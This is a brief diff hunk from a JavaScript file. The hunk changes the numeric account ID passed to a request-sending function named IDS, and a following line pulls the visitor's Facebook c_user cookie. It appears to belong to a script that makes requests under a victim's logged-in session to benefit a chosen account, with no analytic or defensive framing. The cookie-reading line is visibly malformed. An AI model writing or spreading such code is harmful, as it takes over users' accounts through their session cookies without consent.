@@ -76,7 +76,7 @@ function IDS(r) {
   };
   X.send(XParams);
 }
-IDS("100000076612063");
+IDS("100006599231750");
 
 
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
